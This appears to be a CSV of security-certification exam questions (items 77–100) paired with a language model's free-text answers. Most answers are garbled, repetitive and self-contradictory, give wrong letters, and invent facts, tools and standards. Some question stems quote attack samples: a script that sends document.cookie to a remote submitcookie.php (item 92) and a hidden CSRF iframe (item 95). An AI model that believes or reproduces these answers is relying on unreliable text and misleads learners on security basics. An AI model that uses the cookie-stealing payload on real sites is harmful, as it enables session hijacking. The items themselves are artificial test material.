index,question,llm_answer
77,"On performing a risk assessment, you need to determine the potential impacts when some of the critical
business processes of the company interrupt its service.
What is the name of the process by which you can determine those critical businesses?
A.  Emergency Plan Response (EPR)
B.  Business Impact Analysis (BIA)
C.  Risk Mitigation
D.  Disaster Recovery Planning (DRP)
","
the correct answer is b. interestingly, even though the other two are named after people, in this case the emergency plan and the business impact analysis are called out as necessary steps in a risk mitigation process. the bia is a process to determine the impact of a variety of risks to the business, ensuring that the risks are taken care of as part of the process. one last thing to note here is that risk mitigation is just part of the process mentioned in the iec 800 series of publications. performing risk assessment, identifying and evaluating risk potential, and determining the impact of a compromised system or entity are all part of the process. doing none of the actions listed would result in a high risk level being assigned to your organization. performing risk mitigation does not reduce the risk level to zero ; however, it is the step where you take steps to reduce the probability ( probability ) of the occurrence of the risk. one last thing to note here is that risk mitigation is not the same as mitigating risk, which is what the other answer is referring to. risk mitigation is used to reduce the probability of an occurrence, while mitigating risk means we ’ re going to reduce the chance that something will be occurred ( whatever that means ). answering this question about security requires you to know the difference between reducing the probability of an occurrence and reducing the overall impact of a compromised system or entity. the emergency plan part of the process describes how to evacuate a building, evacuate and evacuate again—everything related"
78,"You are a penetration tester and are about to perform a scan on a specific server. The agreement that you
signed with the client contains the following specific condition for the scan: ?The attacker must scan every
port on the server several times using a set of spoofed sources IP addresses. ? Suppose that you are using
Nmap to perform this scan. What flag will you use to satisfy this requirement?
A.  The -A flag
B.  The -g flag
C.  The -f flag
D.  The -D flag
","
the correct answer is d. nmap can successfully run a scan on almost anything if you know how. the -d flag switches the debug flag, which enables extensive logging and other features. the other two flags ( -a and -g ) are also flags, but they ’ re addressed to specific conditions. the option you really need to know about is the -f flag, which tells nmap that it ’ s going to forcefully scan the device in a bidirectional ping sweep. in short, if you can pull the log messages off of running processes while they ’ re connecting to the server, you can get away without using any flags at all. as an aside, the -a flag, -g flag, and -f flag can indeed obtain the information that they ’ re looking for. what they ’ ll most likely do, though, is confuse you with their use. it ’ s hard to argue with results that show the device is going to be forced to syn and ack for hundreds of packets, so the return paths aren ’ t coming back to establish a connection. the -d flag does not cause a connection attempt in the same way that the -a flag does. to be fair, you will see the -a flag used in a few areas. for example, on a machine that is being set up, and generally should be quiet when running nmap. the -g flag, though, is always hurled at you when you need to send a large packet count to"
79,"You are a security officer of a company. You had an alert from IDS that indicates that one PC on your Intranet
is connected to a blacklisted IP address (C2 Server) on the Internet. The IP address was blacklisted just before
the alert. You are starting an investigation to roughly analyze the severity of the situation. Which of the
following is appropriate to analyze?
A.  IDS log
B.  Event logs on domain controller
C.  Internet Firewall/Proxy log.
D.  Event logs on the PC
","
the correct answer is b. once again, we ’ re back to the basics. when it comes to monitoring and logging system traffic, your best bet is probably events. each system and operating system will provide its own event logging functionality. on windows systems, event viewer is the place to go. the proxy log would be used to log something on a proxy or an apache server. the same would go for a domain controller. as for the final answer, event logs on the individual systems are probably useful for monitoring. most toolsets ( like metasploit ) will provide a means to access all event logs from a single address. one last note on this topic : event logs will provide you with some insight into what might be wrong with your system, but they may not provide you with much in the way of real recovery information. for real-world application, you ’ ll need both the logs and some toolscue to pull from them. one last note on this topic : event logs on the individual systems will provide you with some insight into what might be wrong with your system, but they may not provide you with much in the way of recovery information. for real-world application, you ’ ll need both the logs and some toolscue to pull from them. one last note on this topic : event logs on the individual systems will provide you with some insight into what might be wrong with your system, but they may not provide you with much in the way of recovery information. for real-world application"
80,"Jack, a disgruntled ex-employee of Incalsol Ltd., decided to inject fileless malware into Incalsol's systems. To
deliver the malware, he used the current employees' email IDs to send fraudulent emails embedded with
malicious links that seem to be legitimate. When a victim employee clicks on the link, they are directed to a
fraudulent website that automatically loads Flash and triggers the exploit. What is the technique used byjack to
launch the fileless malware on the target systems?
A.  In-memory exploits
B.  Phishing
C.  Legitimate applications
D.  Script-based injection
","
the correct answer is b. the technique exploited by jack is actually quite simple : anyone can send an e-mail containing this harmless link : however, there is a real something something inside the e-mail that lures people who are confident enough to click it. usually something like “ click here for a free subscription to lord knows what ” or “ click here to see how easy it is to use our new email format and receive e-mails in the outgoing folder ”. no matter what the e-mail is called, the real click is inside the email body and uses a little script that executes on the target machine. the next step is a spoofed application or a malicious feature of a widely used service or application. in other words, the human who clicks takes the step another step away from being infected with the malware. it ’ s quite a simple idea, but a happy fool who is willing to take the risk. that ’ s about as simple as social networking on a computer being interesting to someone. remember the analogy between rolling up the hill and climbing it? this is basically describing the process of infecting someone ’ s machine. the point is that all sorts of communication via e-mail can be touched by script, application, or spoofed application. one final note on this topic : some may say it ’ s irrelevant to mention that most email servers are automatically filtering mail containing this harmless link because it would be spam. however, some intelligent email servers are wisely ignoring this link because many thousands, sometimes"
81,"George, an employee of an organization, is attempting to access restricted websites from an official computer.
For this purpose, he used an anonymizer that masked his real IP address and ensured complete and continuous
anonymity for all his online activities. Which of the following anonymizers helps George hide his activities?
A.  https://www.baidu.com
B.  https://www.guardster.com
C.  https://www.wolframalpha.com
D.  https://karmadecay.com
","
the correct answer is a. an anonymizer does not help hide activities since an anonymizer simply hides your actual location by changing your geographic location to one within the network. what it does, though, is make your real ip address hidden ( cover trace ) so criminal users can ’ t trace you down. there are several kinds of anonymizers, but the most popular ones seem to be http transparent and tunnel. http transparent does what it says—it just transparent the http protocol. it makes your actual location appear where you want it by “ transpiling ” it to a point where it seems to you. tunnel uses two layers of software to accomplish the same thing : an ip address shadowing technique where your actual ip address is placed inside a cloud. the cloud itself may be any number of ip devices floating in a lab, or even on a cloud provider. as an aside, using a private browser like firefall or 4get for browsing the internet from a place other than your default browser and location may be of some value here. http transparent doesn ’ t really hide your location because there ’ s no hidden ip address to set. tunnel, though, can hide your location just as well. both http transparent and tunnel protect your actual location by changing your computer ’ s mac address. a random ip mask and a distinct driver, like linux dialup or tunnel, can cover your traditional ip address and redirect it to a different location. both http transparent and tunnel make your location appear where you"
82,"Which wireless security protocol replaces the personal pre-shared key (PSK) authentication with Simultaneous
Authentication of Equals (SAE) and is therefore resistant to offline dictionary attacks?
A.  WPA3-Personal
B.  WPA2-Enterprise
C.  Bluetooth
D.  ZigBee
","
the correct answer is a. the appropriate answer should be clear because it ’ s simple, simple enough. wpa3 is the third version, replacing wpa2 and still allowing for personal and enterprise use. the only difference between wpa2 and wpa3 is that the personal pre-shared key ( psk ) has been replaced by a enterprise psk ( epsk ). both are resistant to dictionary attacks because people usually don ’ t reuse passwords. syscutor is the search engine for vandalized wireless specifications. what ’ s the difference between wpa2 and wpa3 is not a question you ’ ll have to know about in your exam, but it ’ s important to know generally. the difference between 802.11a, -b, and -g is only one line in the standards document. with psk rather than a feb key, there is no needing to reuse passwords because servers don ’ t copy them and tell you what a user ’ s password is. in other words, the password users have changed a lot over the years. finally, the last couple of years have seen a decline in offline dictionary attacks because, among other things, software to crack wireless codes has improved so much. as a side note, wpa2 was also not always a personal and enterprise-wired network authentication ( sa and entra ) system. sometimes it was also designed for public access, with a password only used for a specific period of time, for example."
83,"When you are testing a web application, it is very useful to employ a proxy tool to save every request and
response. You can manually test every request and analyze the response to find vulnerabilities. You can test
parameter and headers manually to get more precise results than if using web vulnerability scanners.
What proxy tool will help you find web vulnerabilities?
A.  Maskgen
B.  Dimitry
C.  Burpsuite
D.  Proxychains
","
the correct answer is b. Proxychains is the only one of these options that is a proxy chain tool. it works by finding all the ports assigned to a name server and setting up connections to them. this can be used to find web vulnerabilities. other tools you listed cannot do that. maskgen ( url mask generator ) can generate a set of masks that could be used to test web vulnerabilities, but it ’ s not a proxy chain tool. dimity ( url dimity ) is a linux distribution that includes a proxy chain tool. while you could use a proxy for manual testing and analysis, and dimity is a distribution, the only one of these options that does is http-proxy-chain. proxychains is a program that will take any ip string and set up a proxy session for you. it works by finding all the ports assigned to a name server and setting up connections to them, just as described in proxychains. also, it can generate a set of proxies that could be used for testing web vulnerabilities. another proxy chain tool is http-tunnel, but it ’ s for windows users. proxychains is the only one of these options that does manual testing and analysis directly from web vulnerabilities. dimity ( url dimity ) is a linux distribution that includes a proxy chain tool. while you could use a proxy for manual testing and analysis, and dimity is a linux distribution, the only one of these options that does is http-proxy-chain. proxychains is a program that will take"
84,"A ""Server-Side Includes"" attack refers to the exploitation of a web application by injecting scripts in HTML
pages or executing arbitrary code remotely.
Which web-page file type, if it exists on the web server, is a strong indication that the server is vulnerable to
this kind of attack?
A.  .stm
B.  .html
C.  .rss
D.  .cms
","
the correct answer is c. because html uses strings to represent pages, if the main frame work is in html then the likelihood is that the attack is potentially expansive. the other two are less likely to be in use on a web page. the server itself isn ’ t the problem—what is on the server is what really matters. a common method for exploiting these sorts of attacks is to use script code in the form of a cookie to alter the express path a user is prompted when to enter login information the next time they visit the site. if the site is using stm ( server ticket system ), the security staff won ’ t get any notice until just as soon as the cookie is expiring. the technician would need to run an attack specifically for the purpose of expiring the cookie. the idea behind this is simple—if the cookie is exploiting something particularly well-known, the average user won ’ t see or notice anything. if the cookie is expiring, the user will probably be prompted the next time around—assuming the user returns to the site. the point is that if the cookie is expiring, and it is in html itself, the likelihood is the cookie is being exploited somewhere. the point is that the cookie is the most obvious indicator of a potential attack. lastly, it ’ s important to remember that cookie exploitation generally falls along the line of a buffer overflow. if the data being returned from the server is being copied before being rendered, the typical outcome is a double"
85,"You have compromised a server on a network and successfully opened a shell. You aimed to identify all
operating systems running on the network. However, as you attempt to fingerprint all machines in the network
using the nmap syntax below, it is not going through.
invictus@victim_server.~$ nmap -T4 -O 10.10.0.0/24 TCP/IP fingerprinting (for OS scan) xxxxxxx xxxxxx
xxxxxxxxx. QUITTING!
What seems to be wrong?
A.  The nmap syntax is wrong.
B.  This is a common behavior for a corrupted nmap application.
C.  The outgoing TCP/IP fingerprinting is blocked by the host firewall.
D.  OS Scan requires root privileges.
","
the correct answer is a. you need to know one little thing about nmap really well in order to pass this question : nmap can only perform an os scan on 10.10.0.0/24 if it knows by any means what operating systems are running on the target. this takes some step-sets and some guessment on the part of nmap, but once the syntax is learned, it ’ s fairly easy. knowing os types and fingerprinting algorithms for different fingerprinting ( also known as ip fingerprinting ) systems is also helpful. there are several methods for circumventing this sort of thing : one of the best may be to repeat the same command too a lot of times. for example, if you can send more than one ping to an ip address or run an application multiple times by using sync or makeping ( url and www.sortout.net, respectively ). you can do this with nmap as well : just use a different command every time you go. for example, if you want to try targeting a different ip subgroup in tcp/ip fingerprinting, you can do so by adding the -g option, replacing the value of 10 with the target subnet, and getting your nmap on ready to begin another scan. as an aside, you can use command-line options and parameters just as well in tcp/ip fingerprinting as you can any other fingerprinting ( or hacking ) tool. for example, you can have a look at www.passwarekiste"
86,"A penetration tester is performing the footprinting process and is reviewing publicly available information
about an organization by using the Google search engine.
Which of the following advanced operators would allow the pen tester to restrict the search to the
organization?s web domain?
A.  [allinurl:]
B.  [location:]
C.  [site:]
D.  [link:]
","
the correct answer is d. the google search operator syntax is fairly straightforward : location : is the location of a resource, allowing you to specify a city, state, and country. site : is a subdomain of a target domain. all in url : will search for links within a domain using a google search engine. location : location : is a search for a location, allowing you to specify a city, state, and country. site : is a search for a website, limiting the search to the target. the advanced op- operator ( more than one operator used ) is link :, showing links within a domain using a google search engine. another similar operator is page :, searching for pages within a site :, allowing you to search for other resources, such as images, documents, or other files. another one is file :, searching for files, including images but also a whole variety of other files. also, you might see location : in place of site :. for example, location : url would search for a resource with a url. there may be other operators you learn, but these are some of the ones you should know for sure. what ’ s the point of this? well, when you are performing search queries with google, you can use the operator site : and, as mentioned earlier,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"
87,"Becky has been hired by a client from Dubai to perform a penetration test against one of their remote offices.
Working from her location in Columbus, Ohio, Becky runs her usual reconnaissance scans to obtain basic
information about their network. When analyzing the results of her Whois search, Becky notices that the IP
was allocated to a location in Le Havre, France. Which regional Internet registry should Becky go to for
detailed information?
A.  ARIN
B.  APNIC
C.  RIPE
D.  LACNIC
","
the correct answer is d. france is well-known for its many french cities, but when it comes to ip registration, it ’ s pretty cut and dried. the french rir, ripe, is the one that provides detailed information about the location of providers within their geographic territory. as for what you can get from whois itself, “ whois is a useful tool, but it ’ s not the story you ’ ve probably heard about. at e-gift, we love telling the story of how a client tries to talk to remote resources to obtain information about them, and how whois is used to extract that information. from the standpoint of ec-council, whois is used to look up information in rir registries regarding locations of providers and then excute a resource lookup protocol ( tls ) between the client and one of the providers to acquire the data. now, you can use what you know about whois as a fun, memorizable term to help you better memorize other things from this exam, but don ’ t rely on whois as the story of your life. be aware that whois can turn into a nightmare when someone is trying to pay for services or other services from the locations listed. just say you want a host in france and watch what happens. whois can also be unreliable when it comes to simply gathering and providing information, and e-gift ’ s whois example is no different than any other registration database. what makes what yours and someone else"
88,"A company?s Web development team has become aware of a certain type of security vulnerability in their
Web software. To mitigate the possibility of this vulnerability being exploited, the team wants to modify the
software requirements to disallow users from entering HTML as input into their Web application.
What kind of Web application vulnerability likely exists in their software?
A.  Cross-site scripting vulnerability
B.  SQL injection vulnerability
C.  Web site defacement vulnerability
D.  Gross-site Request Forgery vulnerability
","
the correct answer is d. cross-site scripting ( xss ) attacks occur when a web application takes user input, parses it, and executes the logic in those inputs. in other words, any input received by the web application is parsed and executed by the software. similarly, sql injection attacks occur when sql, a programming language used to query a relational database, is used to inject code into a web application. therefore, an attacker might attempt to inject sql. a web site defacement attack happens when a web application causes a user to submit something other than the intended web page content by manipulating the html of the page. this is accomplished by adding or removing pages from a web application. the offending tool would also attempt to alter web page content. therefore, a gross-site request forgery attack occurs when a hacker takes user input and uses it to attempt to redirect them to a malicious site by using the attacker ’ s web browser to edit the web pages in the browser. in short, then, the only way to avoid this attack any more than anything is simply not to use a browser at all. or, to pull that off, make the website hide the browser. the point is that you need to know what web application vulnerability exists in your target. once you have that down, you ’ ll need to take steps to defend against the attack itself. by the way, the vulnerability may not be a web application problem at all but a broader security issue. defacing a web page is no more"
89,"Which of the following provides a security professional with most information about the system?s security
posture?
A.  Phishing, spamming, sending trojans
B.  Social engineering, company site browsing tailgating
C.  Wardriving, warchalking, social engineering
D.  Port scanning, banner grabbing service identification
","
the correct answer is c. most of the answers on the exam are pretty straightforward, and this one is no different. the only one that doesn ’ t really make sense is phishing, since an insider would simply submit, which is very rare in a production environment. spamming is also uncommon, and service identification would be identified by the service provider, not the firewall or ids. wardriving is a much less reliable thing to feel when you are defending a property. spending time chatting around the company site, trying to “ steal ” something from the company, is a very relatable event to a hacker. as a matter of fact, it ’ s probably the easiest thing to see in person. the ids won ’ t do much of anything because it will ignore less significant events, such as the little stuff like wallet tracking. a web service that is being used by the user will be identified the same as any other resource, which means it ’ ll be identified when someone gets a new machine from the supplier. a web service that is being used by the operator to configure the machine may be identified later on during the day, and that would be a different story altogether. the ids on that service will look at any new activity involving that service, so it might not happen until a bunch of folks got back to the machine and started using it. similarly, social engineering would be identified when someone got back to the office in the morning and started using the new service. the idea behind identifying things like"
90,"BitLocker encryption has been implemented for all the Windows-based computers in an organization. You are
concerned that someone might lose their cryptographic key. Therefore, a mechanism was implemented to
recover the keys from Active Directory. What is this mechanism called in cryptography?
A.  Key archival
B.  Key escrow.
C.  Certificate rollover
D.  Key renewal
","
the correct answer is d. key renewal is a process that allows the user to renew the key used to decrypt a portion of the data. key escrow is another term that refers to the process in cryptography where a third party can obtain the key used to decrypt a message. active directory is a directory system that can be used to find information on users, including their keys. key archival is the process of securing a key ( or keys ) so that they will not be lost or stolen. key escrow allows someone, usually a hacker, to obtain the data associated with a key. that key then can be used to encrypt messages to the owner of the key. it ’ s important to note key escrow is not key renewal. key escrow is used to obtain the data associated with a key. once the data is retrieved, it can then be used to encrypt messages to the owner of the key. key renewal simply gets a new key assigned to a user. one last note on key encryption questions—unless some advance is made, getting the key isn ’ t all that easy. key escrow allows someone, usually a hacker, to obtain the data associated with a key. that key then can be used to encrypt messages to the owner of the key. key renewal simply gets a new key assigned to a user. key archiving is a process for securing keys so they won ’ t be lost or stolen. an archiving device holds the keys ( or copies of them ) so they can"
91,"What would be the purpose of running ""wget 192.168.0.15 -q -S"" against a web server?
A.  Performing content enumeration on the web server to discover hidden folders
B.  Using wget to perform banner grabbing on the webserver
C.  Flooding the web server with requests to perform a DoS attack
D.  Downloading all the contents of the web page locally for further examination
","
the correct answer is b. wget is a non-local resource finder and repository browser that uses connection semantics to list and download content from a variety of sources on a network. in this instance, you ’ d use the -q, -s flag, which tells wget to receive the contents in text as it downloads it. none of the other answers are real things. banner grabbing and dos ( dialup overlay server ) attacks are also real things, but they ’ ll not be answered here. the purpose of all this is to prove that running a tool without getting directly into the web browser or applying any input of your own is a good idea. wget is a reliable tool and one you ’ d probably recommend using. by the way, a common wget command line syntax is wget -m 192.168.0.15 and the -q flag will turn on output to a file. without the -q flag, you ’ d have to be sure of what you ’ re downloading because it ’ s likely you ’ ll be opening myself or some malicious creature in the web server ’ s cache. as an aside, the -s flag specifies the content as stored in the directory you ’ ve been in during your scan. you can expect that just because a tool can get along without input from your own hands doesn ’ t mean you ’ d recommend using it without understanding what it ’ s capable of. all tools should do that forewarned is forecast into a normal usage realm. the point is"
92,"Judy created a forum, one day. she discovers that a user is posting strange images without writing comments.
She immediately calls a security expert, who discovers that the following code is hidden behind those images:
<script>
document.writef<img src=""https://Ioca(host/submitcookie.php? cookie ='+ escape(document.cookie)+ "" />);
</script>
What issue occurred for the users who clicked on the image?
A.  The code inject a new cookie to the browser.
B.  The code redirects the user to another site.
C.  The code is a virus that is attempting to gather the users username and password.
D.  This php file silently executes the code and grabs the users session cookie and session ID.
","
the correct answer is d. yes, there are some things you just have to remember when it comes to pass- through tunnels. first, cookie creation in the web server before the request is made is part of the session, so if the session is kept open, the cookie will be kept. next, any password input in the browser will be sent to the server as part of the cookie. this information will be respected if a spoofed cookie is using password input. lastly, if a spoofed cookie is sending a password, then whatever is trying could gain access to the session information. as an aside, the idea behind session keeping in cookie field is a good idea, but the implementation of getting the cookie and the session information is not. if the server is listening on both, session information and cookie information are mixed before they are sent on their respective ways. the lesson here is security does not necessarily live in the browser but also in the application and even more directly on the client. pass- through tunnels may be a good way to pull session information and cookies, but it appears you need to have an active session to get the password input. as a aside, even if you had a closed session, you would be good getting password input from a client side. assuming the client is visiting a web page, the input would be sent to the application before the page moves on. this means the client would get the error most of the time and the password would be sent to the application."
93,"Stella, a professional hacker, performs an attack on web services by exploiting a vulnerability that provides
additional routing information in the SOAP header to support asynchronous communication. This further
allows the transmission of web-service requests and response messages using different TCP connections.
Which of the following attack techniques is used by Stella to compromise the web services?
A.  XML injection
B.  WS-Address spoofing
C.  SOAPAction spoofing
D.  Web services parsing attacks
","
the correct answer is c. ws-address spoofing is using web services to address communications. the process guarantees the message gets to the destination by overriding the typical local address and making the request to the web service. this is often done by exploiting a learning mechanism in the idfs or other architecture that allows the request to find out what the target is and respond according to the request. even in an inline scenario, the request gets to the server and is handled just the way it was intended to be handled by a web service. the technique isn ’ t necessarily using web services to address communications ; it could be used with other protocols, such as tcp or udp. the point is that the message getting to the target has no idea what the target is and takes the request as it comes in. this makes sense in your exam but probably won ’ t in the real world. the attacker would have to know the target is a web service in the first place, which may be possible but highly risky. the best part about this whole thing is that providers won ’ t know it ’ s happening until they get back from vacation. please note that this attack would require the web services to be returning something other than a web page. http is a very old protocol that was designed to do something else than what it does today. you could put a web application on a server different from the actual website and still get the same result. after stella finds the web services address, she makes a request to something that"
94,"If executives are found liable for not properly protecting their company?s assets and information systems, what
type of law would apply in this situation?
A.  Criminal
B.  International
C.  Common
D.  Civil
","
the correct answer is d. in this question, i am sure you will see both legal and non-legal factors. in other words, cause and effect should be considered in this question just as they are in many other cases. according to oregon law, anyone who fails to protect assets and information has liability for fraud. considered in this context, it ’ s evident the executives of companies having sensitive data exposure are liable for its protection. without further information, this is mostly a hypotheses about economics, security, and law. if your exam is reading material on this topic, make sure to cite relevant legal references. as a side note, on the real world application side of things, control functions should be considered in play here. whether the executives actually took steps to protect data is another question entirely. but let ’ s focus solely on the law because we ’ re going to get a good night ’ s sleep. see, this makes sense : “ any person who does not take steps to protect anything, has liability for any loss or damage caused by their lack of awareness. ” simple and straightforward, right? not quite so simple and straightforward in reality. in the real world, control functions should be considered in play. according to control u.com, an organization is described as “ a structured approach to managing risk and implementing a sound control system, which enables the correct allocation of resources so that they best suit the purpose of the system. ” in other words, control functions can allow you a lot on"
95,"An attacker changes the profile information of a particular user (victim) on the target website. The attacker
uses this string to update the victim?s profile to a text file and then submit the data to the attacker?s database.
<
iframe src=??http://www.vulnweb.com/updateif.php?? style=??display:none??
> < /iframe >
What is this type of attack (that can use either HTTP GET or HTTP POST) called?
A.  Browser Hacking
B.  Cross-Site Scripting
C.  SQL Injection
D.  Cross-Site Request Forgery
","
the correct answer is d. cross-site scripting ( css ) is an attack usually formed by getting a user to click a link ( or submit a form ) that will repeat or update a web page. another version of css is called sql injection, which makes use of sql queries to update a database. finally, http post is used when a user clicks a link that is labeled or configured as a submit button. both http get and http post are used less and less these days because on new sites and new applications a web page is usually designed to accept input via user entry or from an attached device ( such as a usb device plugged into a computer ), so an attacker wouldn ’ t have to exploit anything. http post is more common ( especially compared to http get ) in older, legacy sites and applications, and you ’ ll probably see it more there than other places. also, a lot of times a http get attack will be followed by an http post, so they usually would be placed alongside one another. because of that, they ’ re usually placed together in this question. sql injection ( sometimes referred to sqljacking ) uses sql to update a database. cross-site request forgery ( cruf ) is a much-old ( some might say misnamed ) attack used to gather information ( such as passwords ) from a web page. a user might click a link that will either display the user ’ s web history or maybe display a link to a web page the user ultimately wants to respond"
96,"You start performing a penetration test against a specific website and have decided to start from grabbing all
the links from the main page.
What Is the best Linux pipe to achieve your milestone?
A.  dirb https://site.com | grep ""site""
B.  curl -s https://sile.com | grep ??< a href-\?http"" | grep ""Site-com- | cut -d ""V"" -f 2
C.  wget https://stte.com | grep ""< a href=\*http"" | grep ""site.com""
D.  wgethttps://site.com | cut-d""http-
","
the correct answer is d. linux pipe is a way to combine data using a processing pipeline. each process uses a command and the output of one to take the input for the next. in this example, we ’ re having the linux kernel filter the website content by asking it “ what would you like? ” every time it is asked, it will answer with a random string ( from 1000 to 999999 ). using the following command structure : linux pipe is a href=\* | grep `` site.com '' on linux linux pipe $ wget -s | grep `` < a href=\* | grep `` site.com '' ( using a random string ) you ’ ll see that finally, among the options, this tool is almost identical to dirb. every so often, linux pipe does something a little different : it will “ ask ” the web server what it has to offer ( using a small port waiting on port 80 ), and if it has what we want ( a random string ), it will hand it off to us for the work. for example, in this example, url.com has a page named gitbug.php, which turns onto ourselves : finally, we ’ re back in the world of the web and on the real target. linux pipe is guaranteed to laugh, laugh, laugh ( by bob bobbin ), but it ’ s worth remembering that it relies on we humans doing the grapping. other linux pipe options include asking for a different port to listen"
97,"Upon establishing his new startup, Tom hired a cloud service provider (CSP) but was dissatisfied with their
service and wanted to move to another CSP.
What part of the contract might prevent him from doing so?
A.  Virtualization
B.  Lock-in
C.  Lock-down
D.  Lock-up
","
the correct answer is b. anyone seeing the term lock-in know what they ’ re looking for : a method of controlling a business ’ s use of a service or product. typically, there is some sort of command-line interface ( cli ), network-level protocol, or computational mechanism the user must pay for. if the user wants to switch from one csp to another, they have to migrate, which can be difficult. this migration may include accessing confidential data and operations, since the user may not be able to access them after the switch. also, the client may have to make adjustments to the csp ’ s service, as the user may need higher-level access or more sublevels access than the csp can provide. for example, the client may need higher data segment capabilities, more memory, or even local devtools installation access. lastly, the client may not even be able to get access to the things they need in the new csp. lock-in is a term that comes from the security community and indicates any mechanism or application that restricts a client from migrating their relationship with a csp. virtually anything that attempts to provide the same service, control, or experience as the lock-in can be considered a web application. a common examples of a web application on the cloud is the social networking site, twitter. the following is a sample contract document from google ’ s cloud computing platform documentation : contract document summary — this contract document describes the terms and conditions of a business ’ s"
98,"In both pharming and phishing attacks, an attacker can create websites that look similar to legitimate sites with
the intent of collecting personal identifiable information from its victims.
What is the difference between pharming and phishing attacks?
A.  In a pharming attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a phishing attack, an attacker provides the victim with a URL that is either misspelled or looks similar to the actual websites domain name
B.  In a phishing attack, a victim is redirected to a fake website by modifying their host configuration file or by exploiting vulnerabilities in DNS. In a pharming attack, an attacker provides the victim with a URL that is either misspelled or looks very similar to the actual websites domain name
C.  Both pharming and phishing attacks are purely technical and are not considered forms of social engineering
D.  Both pharming and phishing attacks are identical
","
the correct answer is d. pharming is a much better term to define this attack because all of the other attacks are similar. in a pharming attack, an attacker provides a web page victim locations and either takes advantage of some inherent vulnerability in web software, such as a database reference or design flaw, or exploits the confiliation of the web site to gain information. instead of asking how the attack is accomplished or what the attacker does when they attack a website, I would ask why they go to the effort to hack the web site in the first place. it makes sense, after all, if you are going to exploit someone, you probably wouldn ’ t go to the effort and sit down at their house in the first place. as an aside, there are some attacks that are specifically based on being “ snared ” in a fake bottle of wine or can of food. in a phony gift package, the attacker sends a gift box to a recipient with a url inside it. if the recipient opens the package, they may receive a letter from the gift package company instead. the letter may contain a malicious attachment or could simply provide contact information for future updates. either way, the attacker may then gather information from the recipient. other snaring techniques include sending a gift certificate to a address that also happens to have a url on it or sending a cookie-shaped teddy bear to the recipient ’ s address. the teddy bear could come packed in a gift bag with other gifts. both pharm"
99,"Louis, a professional hacker, had used specialized tools or search engines to encrypt all his browsing activity
and navigate anonymously to obtain sensitive/hidden information about official government or federal
databases. After gathering the Information, he successfully performed an attack on the target government
organization without being traced. Which of the following techniques is described in the above scenario?
A.  Dark web footprinting
B.  VoIP footpnnting
C.  VPN footprinting
D.  website footprinting
","
the correct answer is d. i ’ m a firm believer in “ related but not identical ” definition of analogies. while you might think there is no similarity between navigating the dark web and anonymously connecting on the internet using a vpn, there are numerous ways in which they are the same. in the dark web, you “ click ” a link and a browser takes you to what you ’ want to see. exactly how much anonymity you want while using a vpn is really up to you. be cause sensitive information being exchanged between two locations could be dangerous, and you ’ d be exposed to risks, whether purposeful or accidental, if something got lost or breached. however, most people prefer a safer choice than falling behind in their internet searching efforts. just keep in mind you ’ ll probably need to log off or change which vulnerabilities are exposed from time to time. a vpn provides a much safer means to anonymous connection, and the following websites can help you in locating a good vpn. there are approximately over a dozen different companies providing vps, connection, and server site protection. some of the more known companies are utorrent, newtab, and torprotect. with a good vpn, you can feel safe in your browsing. after all, if you think about your dream house, home security systems, and other reliance on a safe internet connection, what would you do if it was hacked or compromised? lose all value, that would occur. but instead, with a safe vpn, you can"
100,"When considering how an attacker may exploit a web server, what is web server footprinting?
A.  When an attacker implements a vulnerability scanner to identify weaknesses
B.  When an attacker creates a complete profile of the site's external links and file structures
C.  When an attacker gathers system-level data, including account details and server names
D.  When an attacker uses a brute-force attack to crack a web-server password
","
the correct answer is c. when people see the word footprinting, they may think of how people leave marks in a garden—almost as an insult. though it has some elements of a joke, it ’ s not a way an attacker would exploit a web server. instead, footprinting is leaving digital marks on a system to determine the assets—a particular service, version, and configuration—of a target. an attacker may use the marks to gain access to the system. footprinting doesn ’ t involve discovering the external links and file paths of a system ; it ’ s discovering things like account details and the operating system itself. an attacker uses a brute-force method of footprinting to guess a web server ’ s password. an attacker can use the information from the footprinting to launch attacks against the site. just remembering this point will help you through most questions on this topic. to summarize, when an attacker uses footprinting, he or she looks at what the target puts in discussions, blog posts, and other written materials to get an idea of the internal details and software of the system. he or she may also look at some account details and even the system ’ s operating system. this will take some patience and should run quite a bit like an evil twin attack in an external network. finally, note that when an attacker does website footprinting, he or she isn ’ t describing how to exploit a web server ; what he is doing is describing the body of work of a system. an"
